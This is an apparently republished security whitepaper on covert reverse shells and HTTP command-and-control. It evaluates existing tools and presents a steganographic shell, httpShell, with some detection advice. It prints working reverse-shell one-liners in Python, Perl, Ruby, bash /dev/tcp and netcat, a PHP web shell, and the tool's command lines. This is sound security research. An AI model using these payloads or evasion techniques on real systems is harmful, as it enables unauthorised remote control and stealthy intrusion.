---
layout: default
title: httpShell Whitepaper
---
This article can also be found in [Hack in the Box Magazine](http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-008.pdf)

## httpShell

### 0x00 Abstract

Discretion is a necessity when performing a penetration test. The job is to test a network's defenses as well as the security team's ability to detect and respond to an incident, while being as discrete as possible. Neohapsis Labs looked into the obstacles and solutions for developing a communication channel with a device residing in a protected and monitored network. This paper will discuss these findings. A new tool demonstrating some of these techniques will also be discussed. This paper will also speculate as to defensive solutions for such threats.

### Table of Contents

- 0x01 -- Introduction
- 0x02 -- Attacks and Defenses 
  - 0x02.01    -- Network Address Translation / Port Address Translation (NAT/PAT) 
  - 0x02.02    -- Ingress Port Filtering
  - 0x02.03    -- Egress Port Filtering
  - 0x02.04    -- Application/Session Level Protections
- 0x03 -- Stealthy Solutions
  - 0x03.01    -- Small Interpreted Shells
  - 0x03.02    -- One Liners
  - 0x03.03    -- Meterpreter Options
  - 0x03.04    -- NGRS - Next Generation Reverse Shell
  - 0x03.05    -- RWWWSHELL - Reverse WWW Shell
- 0x04 -- httpShell
  - 0x04.01    -- Usage
  - 0x04.02    -- Demo
  - 0x04.04    -- Shortcomings
  - 0x04.05    -- Wishlist (the perfect shell)
- 0x05 -- Credit Where Credit is Due
- 0x06 -- Thanks

### 0x01 -- Introduction

The threat that our industry has convinced business to be most of afraid of this year -- yes the one that starts with an 'A' and ends with a 'PT' -- can be regarded as multi staged. The attacker first assesses the network, then exploits the network, then attempts to maintain a presence in the network while pivoting and spreading throughout. There are many points at which an attacker can be slowed, stopped or detected, but the devices, applications and techniques used by those defending the network can conceptually be broken down into two parts: the network and the end-point. 

In the discussion of stealth, it is important to make a distinction between stealth 'in the air' and stealth 'on the ground'. Whether the goal is to avoid detection in penetration or persistence, the attacker tries to hide her presence both while traversing the network (in the air) and while running malicious code on a system (on the ground). A large part of modern security is comprised of this battle between the attacker who tries to remain hidden, and the defender who attempts to detect and respond to threats. While there is much to be said and much research to be done on the subject of the stealth of malicious code running on a device, this paper focuses on stealth from a network perspective.

### 0x02 -- Attacks and Defenses
This section will describe protections that impede against an attacker controlling devices on a network as well as methods by which attackers can circumvent these protections.

#### 0x02.01 -- Network Address Translation / Port Address Translation (NAT/PAT)

Network Address Translation (NAT) and Port Address Translation (PAT) are fairly ubiquitous today, and while not intended to be used as a security mechanism, make it significantly more difficult to remotely control an exploited device inside a network. NAT is a system by which one set of addresses can be translated into another set of addresses. For example, my computer can have the internal address of 10.10.10.10, while on the other side of my router, it appears as 172.16.0.10. This can be useful for obfuscating the address space used within a system. PAT is widely used in conjunction with NAT and when referring to NAT/PAT most people just say NAT. PAT allows for multiple hosts on one network segment to share an address that is used on another network segment. While PAT has other applications, it is most commonly used to allow an internal network with numerous hosts to share a small number of external addresses. With this technique, egress traffic is accomplished by tracking the source ports and addresses used for establishing connections with outside resources and then routing traffic received at that port on the external interface back to the appropriate internal device. This technique allows ingress traffic when it is configured to forward specific low ports on the external interface to specific internal devices. Most devices residing behind NAT/PAT will not have ports forwarded to them and it is impossible to reach these hosts directly from outside of the network. In the case where there is a port forwarded to an internal host, it is likely that there is already a service bound to that port and it would be impractical if not impossible for an attacker to communicate on that port without disturbing the legitimate service. 

Two main techniques for the attacker's circumvention of NAT/PAT come to mind (though more may exist). The first is to find another way to reach the internal device. This could be via routing through another compromised device or by somehow disabling NAT/PAT. The second option would be for the attacker to have the internal device initiate a session with with an outside device controlled by the attacker. Using only NAT/PAT, there isn't anything to prevent an internal device from establishing a connection with an external device. This is commonly the case with compromised network end-points. If an attacker can execute arbitrary code on an internal device (via browser/plugin exploit, spear phishing...) he can instruct that device to connect back to his outside computer and initiate a control session.

#### 0x02.02 -- Ingress Port Filtering

From the perspective of the would-be-attacker, ingress port filtering has much the same effect as NAT/PAT in that it prevents direct connections to to internal hosts from outside the network. Traditional firewalls do nothing more than apply an Access Control List (ACL) to inbound traffic. This has the effect of disallowing or allowing traffic based on several criteria. The common criteria used for simple port filtering are source address, destination address, source port and destination port. The technique of filtering ingress traffic based on these properties is an effective way of hiding network resources and ensuring that internal resources are not inadvertently exposed to the outside. For example, most hosts on a network do not need to **receive** HTTP traffic, so the firewall should not allow **incoming** traffic destined for an internal host on port 80 or port 443. Following the security principle of least privilege though, what is a better idea from the defender perspective and what is more common is to block all traffic and explicitly permit the traffic that should be allowed. Ingress filtering is similar to NAT/PAT in that it essentially hides most internal services while intentionally exposing a few. Just as with NAT/PAT, an attacker can communicate with a shell or CNC service on a device blocked by ingress firewall rules by having that device initiate the connection.

#### 0x02.03 -- Egress Port Filtering

There are many reasons why someone might want to filter traffic leaving their network. Least privilege is a common principle in security and it stands to reason that we should deny any traffic from leaving our network except for traffic we explicitly allow. Aside from generally being a good idea, egress filtering has been widely adopted as a response to outsiders trying to control devices inside the network. However, an attacker can easily circumvent this by running her shell or CNC over one of the allowed egress ports. For example, if a network allows its users to browse the internet, an attacker could setup a reverse shell that phones home on TCP port 80.

#### 0x02.04 -- Application/Session Level Protections

The theory of defense in depth says that if we don't want something to happen we should attempt to prevent it in every possible way, or at least at every layer of our architecture. The above defenses operate mostly at the network and transport layer by filtering or otherwise blocking unwanted traffic. There are also of course other protections operating at the lower layers. The problem up until this point is that there is no way of detecting whether that packet leaving your network on port 80 is someone checking his web mail or me exfiltrating your trade-secrets. Application and session layer protections attempt to address this by ensuring that traffic on a given port looks like traffic on that port is supposed to look. 

For example a corporate network might only allow egress on port 80 and 443. To ensure that their employees are not violating any policies and to prevent other unwanted HTTP traffic, they install a transparent proxy that intercepts and forwards any HTTP traffic, modifies or blocks unwanted content, and forwards it to its intended destination. This type of implementation will most commonly operate in the opposite way as a firewall: it will explicitly block unwanted sites (porn and Facebook), and allow everything else. If an attacker is trying to run ssh over port 80, the proxy wont know what to do with the traffic and wont forward it. 

Another example of an upper-layer protection would be an IDS/IPS. These devices can log or block "illegitimate" traffic. The definition of illegitimate will vary with vendor and implementation, but the IDS' checks can include checks for known signatures of malicious traffic (a well known virus or exploit going over the wire), checks for improperly formatted or irregular traffic (ssh over port 80), or heuristic checks for variations from what the device considers to be normal traffic.

The commonality between all variations of upper level protections is that they attempt to detect or prevent traffic that they see as bad. Lower level protections might be blocking all traffic except for egress port 80 TCP sessions to example.com and it is the application/session layer protections' job to decide whether those packets are valid and benign HTTP traffic....

### 0x03 -- Stealthy Solutions

Imagine you are on a penetration test and are about to send out a phishing email asking user's to read the important message from the CEO contained in your memo.pdf attachment. As you craft your malicious pdf you ask yourself what sort of payload it should execute. There are so many options, but how can you best ensure that your attack goes off undetected. The following is a sampling of reverse shell options as well as a brief discussion of their merits in light of the previous discussion.

#### 0x03.01 -- Small Interpreted Shells

These are shells, usually written in interpreted languages, that try to minimize their size in bytes. This is usually just for the sake of elegance, but it can also help with evading some heuristic on-disk detection methods (see [NeoPI](http://github.com/neohapsis/neopi)). These can be launched by injecting them into a running application (think php command injection) or by launching them from the command line. Here are some that we at Neohapsis have written and some favorites from others:

- [Python](https://gist.github.com/1526000)
    {% highlight python %}
exec("import socket,subprocess\nHOST = '10.0.0.1'\nPORT = 80\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nf = s.fileno()\nsubprocess.Popen('/bin/sh',stdin=f,stdout=f,stderr=f)")
{% endhighlight %}

- [PHP](https://gist.github.com/1526009)
    {% highlight php %}
<? $_GET[1]($_GET[2]) ?>
{% endhighlight %}

- [Perl](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    {% highlight perl %}
use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
{% endhighlight %}

- [Ruby](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    {% highlight ruby %}
f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f
{% endhighlight %}

There are two main shortcomings with these options. The first is that they don't provide any form of stealth. These programs simply run /bin/sh over a TCP socket. This is often problematic. The second frequent shortcoming with these small interpreted shells is a lack of functionality. The Python, Ruby, and Perl applications above hook a process's file descriptors directly into a TCP socket, so you get a fairly functional shell, but the PHP shell as well as many small reverse shells you will find on the internet are much more difficult to use. This is because many of these shells provide the ability to run commands rather than run a shell. This means that if you ```bash cd ..``` you won't actually change directory because each command is spun up in a different bash process.

#### 0x03.02 -- One Liners

Functionally, these are quite similar to the small interpreted shells. They use built in commands (usually \*nix) to open a TCP socket and pipe a shell to it. These also suffer from the main shortcoming of the small interpreted shells: they implement no stealth. A connection will look like exactly what it is -- a shell. The only exception to this would be reverse SSH. This implement encryption, but in the presence of egress filtering or an IDS this may get blocked of set off alarms.

- [Bash](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    {% highlight bash %}
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
{% endhighlight %}

- [Netcat](http://netcat.sourceforge.net/)
    {% highlight bash %}
nc -e /bin/sh 10.0.0.1 1234
{% endhighlight %}

- [SSH](http://www.openssh.com/)
    {% highlight bash %}
# this runs on the remote machine (the slave)
ssh -R 1337:localhost:22 my_user@172.16.11.11
# this runs on your machine (the master)
ssh localhost -p 1337
{% endhighlight %}

#### 0x03.03 -- Meterpreter Options

Meterpreter gives you a lot of different options for shells. While Meterpreter is often times overkill, it does have some cool features. While the topic of this paper is stealth in networking, Meterpreter implements some stealthy practices while running as well. It hollows out other processes and runs inside their address space as opposed to forking a new process (stealthy) and it goes to great lengths to avoid touching the disk (stealthy). It can also comes in a variety of formats (PE,elf,PHP,Java....), allowing for great versatility while still providing a consistent interface.  

On the subject of network stealth as well, Meterpreter has some neat features. It is capable of running across a variety of protocols (TCP,UDP,HTTP....) which helps a lot in trying to get out of a locked-down network. The most stealth conscious of these are the reverse HTTP and reverse HTTPS meterpreter though. With these, the "HTTP client" (the owned machine/ slave) packages responses from Meterpreter as HTTP/S requests that are sent to an "HTTP server" (the attacker machine / master). The master packages its side of the session as HTTP responses. This makes the Meterpreter session look quite similar to normal HTTP traffic. The HTTPS Meterpreter works exactly the same except for it adds an additional layer of encryption. The problem for the would-be-stealthy attacker though is that both of these options can be detected by IDS. 

How, you ask, can the Meterpreter HTTPS shell be detected? Some great [research](http://www.netresec.com/?page=Blog&month=2011-07&post=How-to-detect-reverse_https-backdoors) by Erik Hjelmvik reveals a number of problems. Firstly, the X.509 certificates automatically generated by Metasploit are invalid (obviously). Secondly, the contents of the certificate fields contain high amounts of entropy. Thirdly, the DNS hosts specified in the CN field don't resolve to a real host. In a tightly secured network, some of these problems might already set off alarms, but if they aren't already detected by IDS, a signature could easily enough be written. That being said, this reverse HTTPS shell is pretty slick and could be really difficult to detect with a bit more work.

#### 0x03.04 -- [NGRS - Next Generation Reverse Shell](http://www.securebits.org/projects/giant-reverse-0.9.5.tar.gz)

The Next Generation Reverse Shell (NGRS) from Ar Samhuri offers many different options for obfuscation and steganography. This shell allows you to tunnel traffic through HTTP, FTP, POP3 and NTP. The client and server are written in C which helps a lot with portability (you could compile it on a toaster). This is a no-nonsense shell that seems to work well.

As for the actual mechanics of mechanics of the communications, I was primarily looking at the HTTP offering. I fired up the gr binary that gcc spit out with the following options:

{% highlight bash %}
#on the server (master)
./gr -L
#on the client (slave)
./gr -s 192.168.0.123
{% endhighlight %}

The server was then given a lovely shell, boldly stating ```[192.168.0.123]$```. I proceeded to run ```whoami``` and ```ls``` and my responses came back quickly and in proper formatting. Functionally, it seems like a shell. Bravo. I shut down the shell and took a look at the pcap that I had recorded with tcpdump. The first thing I noticed is that what I had captured looked like a fairly benign HTTP session. Upon further inspection, I saw the following HTTP traffic:

- An ```HTTP GET``` request for "/I/am/ready" sent to 192.168.0.123 with the ```Host``` header set to 'www.securebits.org'
- An ```HTTP/1.1 200 OK``` Response from the server containing ```<html>whoami</html>```
- An ```HTTP POST``` request for "/results" with the data ```mastahyeti\n```
- et cetera....

What you will notice is that there is a session of sorts established and maintained between the master and slave. When the slave is ready for a command, it says so and the master leisurely responds with instructions. This is a good model, because it doesn't require the slave to continuously check in with the master (a shortcoming of my tool that you will see later). What you also see is that there isn't much effort to hide what is going on here. From the standpoint of automated detection, there are a few shortcomings to this shell:

- The HTTP host header is set to "www.securebits.org". A protective proxy might already be blocking this as a "hacking" website. If not, a signature would be trivial to write.
- The "ready" message is a request for the resource "/I/am/ready". Again, a signature could be easily written to spot this.
- The messages are all in plain text without obfuscation. If a curious administrator were watching, they would see right through this. Automated detection would also be possible.

While these are problems for the would-be-hidden attacker, it would be easy to patch the code to use different headers. The real problem is the lack of obfuscation in the message. Simply looking for common commands would be a dead giveaway. How often are you going to see a website whose contents are only ```<html>ls</html>``` or ```<html>cat /etc/shadow</html>```. That being said, this is a great step in the right direction and with some work could be quite difficult to detect. This may be different using some of the other protocols such as HTTPS, as I only looked at the HTTP method for this tool.  

#### 0x03.05 -- [RWWWSHELL - Reverse WWW Shell](http://freeworld.thc.org/papers/fw-backd.htm)

RWWWSHELL is a reverse shell over HTTP written by van Hauser. In many regards this is similar to NGRS, one of the primary differences being that RWWWSHELL doesn't implement any protocol other than HTTP. This is not a problem though, as RWWWSHELL does a very good job of running a shell over HTTP. This application is written in Perl, which, while portable between \*nix distros, is not very portable to Windows. There is of course a Windows port for Perl, but if you have compromised a Windows host, the last thing you want to do is install migw and compile Perl before getting a usable shell. 

The first thing that strikes me about RWWWSHELL is the impressive list of configurable options. You can set any of the following in the Perl file:

- HTTP Method (GET/POST)
- URI Prefix (to make requests more believable)
- Process Name (for hiding from ps)
- Password (more on this later)
- Listen Port
- Shell (default: /bin/sh)
- Scheduling options
- Proxy options

The first two options (HTTP Method and URI Prefix) are really good ideas because they allow you to change what URI on the "HTTP server" the "HTTP client" is requesting. This was one of the places where NGRS was easily detected out of the box. The server port and proxy settings are nice to have because they ensure that we can actually get out of the network. As stated before, a lot of corporate environments employ HTTP proxies that require authentication, so being able to traverse these is a big plus. The timing/scheduling options are one of the features that really sets this shell apart from a lot of what I have seen. This application allows you to set the delay between HTTP requests (to minimize network traffic), as well as to schedule specific times of day for exchanges between the client and server (to even further reduce the traffic). It is one thing to think about a network administrator noticing a shell that is generating hundreds of requests per minute, but it is another story all together when the shell makes one HTTP request per day! 

Now that we have a sense of what this application can do, lets take a look at some base-case traffic. The first thing we see is a HTTP POST request for ```/cgi-bin/orderform``` at host 127.0.0.1 with some data.

{% highlight http %}
POST /cgi-bin/orderform HTTP/1.0
Host: 127.0.0.1
User-Agent: Mozilla/4.0
Accept: text/html, text/plain, image/jpeg, image/*;
Accept-Language: en
Content-Type: application/x-www-form-urlencoded

vjW5P97cS96vR970Ddtttz
{% endhighlight %}

The next thing we see is a response from the server with more opaque data:

{% highlight http %}
HTTP/1.1 200 OK
Connection: close
Content-Type: text/plain

fjW5P97cS96vR971C870r+V5T8RpSegoDfWjnz
{% endhighlight %}

The last HTTP packet we see is another HTTP POST request from the client.

{% highlight http %}
POST /cgi-bin/orderform HTTP/1.0
Host: 127.0.0.1
User-Agent: Mozilla/4.0
Accept: text/html, text/plain, image/jpeg, image/*;
Accept-Language: en
Content-Type: application/x-www-form-urlencoded

MjW5P97cS96vR971AfgPrf7DrjgoSjWaOjF1SdgoR92qB96QOfFjragurh6pUz/+BqH86AAegoH86AAegmnz
{% endhighlight %}

This looks like some fairly normal HTTP traffic aside from the weird data. At first glance it doesn't appear that writing a signature for this traffic would be at all trivial, especially when consider that the ```Host``` header and URI are configurable by the user. The main shortcoming of this application comes when we take a look at the source. When I enter the ```ls``` command it is first concatenated with the password set in the configuration file, then uuencoded (very similar to base64, just older and using a different character set) and then all of the special characters are replaced with lower case alpha characters. This makes the data look like it is in fact base64 encoded, though attempting to base64 decode will result in garbage. This incorporates no cryptography and the password actually has **no** effect on a third parties' ability to decode the data. The following script will decode the above data:

{% highlight python %}
#usage:
#=>python ./un_rwwwshell.py g5mAlfbknz
from binascii import a2b_uu
from sys import argv

tr =     {'a':'=','b':"'",'c':')','e':':','d':'(','g':'&','f':';','h':'>','k':',','j':'<','m':'$','l':'#','o':'%','n':'*','q':'!','p':']','s':'"','r':'@','u':'\\','t':'`','v':'-','z':'\n'}
input = list(argv[-1])
print a2b_uu(''.join([tr.get(input[x],input[x]) for x in range(0,len(input))]))
{% endhighlight %}

After running it though my handy application, we see the the first request contained ```supersecret$ ``` to which the server responds ```supersecretcat /etc/shadow```. From this it is clear that I configured the application to use 'supersecret' as its password. I will let the reader figure out what last request contains. 

It is hard not to have mixed feelings about the stealth of this technique. The author makes no claims of cryptography, stating that this is merely a proof-of-concept application, and the casual observer is going to think that the data is base64 encoded binary data. The problem arises when we think about methods for automated detection. It would be trivial to write a signature that looks for ```r+V5T8RpSegoDfWjnz``` (which decodes to /etc/shadow) and a handful of other strings that are common in attack scenarios. With a defensive technique such as this there would be very few false positives and a fairly high detection rate. _Note: for this detection technique to be effective you would actually need to have at least three signatures for each malicious string. This is just the nature of b64/uu encoding_ 

All things considered, this is a great tool that made some definite improvements to what was available. 

### 0x04 -- httpShell

Building upon the currently available tools, and attempting to address some of their shortcomings, we at Neohapsis Labs developed another proof-of-concept HTTP reverse shell called httpShell. The intention of this shell was to demonstrate an steganographic technique that we believe can be useful for a variety of applications requiring discretion and stealth. The goal of cryptography is to make sure that one's enemies cannot read or tamper with one's messages. The point of steganography is to make sure that one's enemies don't realize that one is transmitting messages. While previously discussed applications offer a degree of steganography in that they encapsulate their messages in HTTP packets, an in-the-know observer can easily detect, and in some cases reverse, any obfuscation techniques being implemented. The httpShell encodes transmitted data into user-provided dictionaries, hopefully making it indistinguishable from ordinary traffic. The most basic example of this would be to encode the data into valid HTML tags so that actual web pages appear to be transmitted between server (master) and client (slave). The following section will discuss this technique at further length.

#### 0x04.01 -- Usage

While the application comes with some dictionaries, it is expected that a user will create his own to better defeat automated detection. Look at the provided example dictionaries for an understanding of how to create your own. Refer to the projects [GitHub](https://github.com/Neohapsis/httpShell) page for a description of how the various options work. The application has some baked in default settings for testing the application on your local machine. The only thing that **needs** to be specified is whether the application will run as server or client. _Note: for the server to run on ports bellow 1024 you will need to run as the root user on \*nix_

#### 0x04.02 -- Demo

For the purpose of a somewhat realistic demonstration, I have created [client](https://gist.github.com/1541305) and [server](https://gist.github.com/1541313) dictionaries to play with. I run the server(master) with the following options:

{% highlight bash %}
sudo coffee ./httpshell.coffee --host 127.0.0.1 --port 80 --secret supersecret --clientdict ./example_files/example_client_dict2 --serverdict ./example_files/example_server_dict2 server
{% endhighlight %}

and run the client(slave) with the following options
{% highlight bash %}
coffee ./httpshell.coffee --host 127.0.0.1 --port 80 --delay 10000 --secret supersecret --clientdict ./example_files/example_client_dict2 --serverdict ./example_files/example_server_dict2 client 
{% endhighlight %}

Lets take a look at what is going on here. The ```host``` and ```port``` settings describe where the server should listen and where the client should connect. The ```delay``` tells the client how often to send a request to the server. Here we have this set to 10000 ms, which is 10 seconds. The ```secret``` is set to 'supersecret' and is used for the AES256 encryption of the messages. The ```clientdict``` specifies what dictionary file to use for encoding/decoding messages from the client. The ```serverdict``` specifies what dictionary file to use for encoding/decoding messages from the server. 

If we take a look at the client dictionary file, we see lines like this:

{% highlight bash %}
...
gs_upl=;
bav=on.2,or.r_gc.r_pw.,cf.osb;
fp=f5d834441ed2a5b;
biw=1920;
bih=945;
tch=1;
ech=1;
...
{% endhighlight %}

These lines look reasonably like data that might be seen in a legitimate HTTP POST request. Looking at the server dictionary file, we see some lines like these:

{% highlight bash %}
...
<application name="fx" version="8.143.71" />
<application name="fx" version="8.90.188" />
<application name="fx" version="8.26.132" />
<application name="fx" version="8.203.21" />
...
{% endhighlight %}

These are the 'dictionaries' that the shell's traffic will be encoded into.

Running the shell with the above options results in a generic looking shell on the server side. When I run a command I get well formatted responses. On the surface, nothing special seems to be happening. Lets take a look at the HTTP traffic that is going on behind the scenes:

First, we see a HTTP POST request from the client(slave):

{% highlight http %}
POST / HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
Transfer-Encoding: chunked

184
U=2e70ea4f44d490f7; S=YBeqj4USbvTn7ZzC5v; LM=1320178066; gs_sm= FF=2; FF=1; S=YBeq4USbvTn7ZzC5s; source=fl U=2e70ea4f43d590f7; U=2e70ea4f43e490f7; LM=1330178066; FF=2; sclient=psy-an gs_upl= FF=7; pbx=773 U=2e70ea4f43d590f7; source=zn sclient=psy-ad hl=se FF=4; ID=63fc6c4537df7fc3; FF=7; bih=945 hl=es q=frank U=2e70ea4f44d490f7; LM=1320171066; psi=Ggv-TpmOIMHOqgGhwcmxAQ.1325271835100.1
0
{% endhighlight %}

Next we see a response from the server(master):

{% highlight http %}
HTTP/1.1 200 OK
Connection: keep-alive
Transfer-Encoding: chunked

43a
<application name="fx" version="8.143.71" /> <application name="fx" version="8.53.36" /> <application name="fx" version="8.182.185" /> <application name="fx" version="8.219.14" /> <application name="fx" version="8.153.247" /> <application name="fx" version="8.253.142" /> <application name="fx" version="8.174.32" /> <application name="fx" version="8.72.114" /> <application name="fx" version="8.45.230" /> <application name="fx" version="8.227.2" /> <application name="fx" version="8.238.72" /> <application name="fx" version="8.54.95" /> <application name="fx" version="8.69.178" /> <application name="fx" version="8.2.226" /> <application name="fx" version="8.127.210" /> <application name="fx" version="8.143.161" /> <application name="fx" version="8.104.35" /> <application name="fx" version="8.108.221" /> <application name="fx" version="8.198.62" /> <application name="fx" version="8.37.168" /> <application name="fx" version="8.80.250" /> <application name="fx" version="8.6.184" /> <application name="fx" version="8.127.210" /> <application name="fx" version="8.192.158" />
0
{% endhighlight %}

Now we see another request from the client(slave)

{% highlight http %}
POST / HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
Transfer-Encoding: chunked

208
U=2e70ea4f43d590f7; TM=1321085899; sclient=psy-al S=YBeq4USbvsTn7ZzC5; sclient=psy-aq FF=2; FF=6; site=analytics.google.com aql= NID=54=RhYqE9VKtplwXYxlfbgaY_HzXNXMiKb28gPRFSUvEGp30u-cqhqTYxx7KnXqS5LTreKL58vh1W1ivUBWu0XDGY4Jdrl2D2wvrNhUbR9draC6rwHp4Gm2yEK0OaEtL-_u S=YBeq4USbvsTn7ZzC5; sclient=psy-aj FF=6; LM=1320168066; FF=5; FF=1; ID=63fc6c4537cf7gc3; ech=1 cp=1 FF=4; U=2e70ea4f53d490f7; S=YBeq4USbvTn7ZzaC5; FF=9; hl=de U=2e70ea4f43d490g7; ID=63fc6c4537cf7gc3; sclient=psy-ap U=2e70ea4f43d400f7; U=2e70ea4f43d490f7;
0
{% endhighlight %}

and an empty response from the server:

{% highlight http %}
HTTP/1.1 200 OK
Connection: keep-alive
Transfer-Encoding: chunked

0
{% endhighlight %}

The first is just the client checking to see if the server has any commands to run. The response to this request has the command "whoami" encrypted and encoded inside its data. The second request is the client responding with my username 'btoews'. The final request does nothing as there are no more commands to run.

The data is quite opaque and meaningless to either the casual on-looker or the IDS. Because the user is encourages to provide his own dictionaries, there isn't really anything that a signature could be written for. The requests and responses are valid HTTP traffic.

#### 0x04.03 -- Shortcomings

As stated before this is a proof of concept. This tool is written in NodeJS which is an interpreted language, meaning that you will need to have Node installed in order to use the application. As with any interpreted language, if you are on a pentest it is not safe to assume that a compromised host will have the languages you want installed. It is not reasonable to compile Node on every compromised system, hence this project's status as a proof-of-concept.

This is a fairly noisy application on the network. While there are options to wait a given amount of time between requests (which helps a lot), there are still several packets per command/response. The method for this implemented by NGRS is much better in that the server (master) doesn't response to the request until it has a command that needs to be run. This requires designing and implementing some rudimentary connection-oriented protocol to run on top of HTTP (the /i/am/ready from NGRS). 

This application allows the user to set a password. This password is used to AES256 encrypt messages between the client(slave) and server(master). Each message is encrypted separately which means that two identical plain-text messages will generate two identical encrypted messages. This has a number of problems, the greatest of which is that it makes the client(slave) vulnerable to replay attacks. Because there is no connection-oriented aspect to the application it is not feasible to implement nonces or message ids and hence there is no quick solution to this.

This application makes no attempts to be stealthy in the way that it runs on the client(slave) computer. If we are up against antivirus or host-based IDS in addition to network IDS this is a big problem. Again: this is a proof of concept.  

Please leave me a comment and tell me about my other shortcomings. :D

#### 0x04.04 -- Wishlist (the perfect shell)

I'm not sure how valuable people will find this technique of encoding malicious data into benign looking data. If there is interest, I think that the strengths of this technique could be combined with other tools to make a production/pentest ready product. I think that the ideal would be write a C application that implements this technique. Borrowing the connection-oriented aspect of NGRS would also be desirable. In a pentest situation it is also very important to be careful about leaving a trail or being detected running on a compromised system (something that meterpreter is good at) and I think it might be worth looking into trying to include aspects of this project and the others listed above into the HTTP meterpreter.

### 0x05 -- Credit Where Credit is Due

- HD MOORE - [Meterpreter HTTP/HTTPS Communication](https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication)
- AR SAMHURI - [Next Generation Reverse Shell](http://www.securebits.org/ngrs.html)
- VAN HAUSER - [Placing Backdoors Through Firewalls/RWWSHELL](http://www.thc.org/papers/fw-backd.htm)
- PENTESTMONKEY - [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### 0x06 -- Thanks

- [arbit](twitter.com/helloarbit)
- [Josh](github.com/josh)
- [Neohapsis Labs](http://neohapsis.com)
- [Steve](http://securitydreamer.wordpress.com)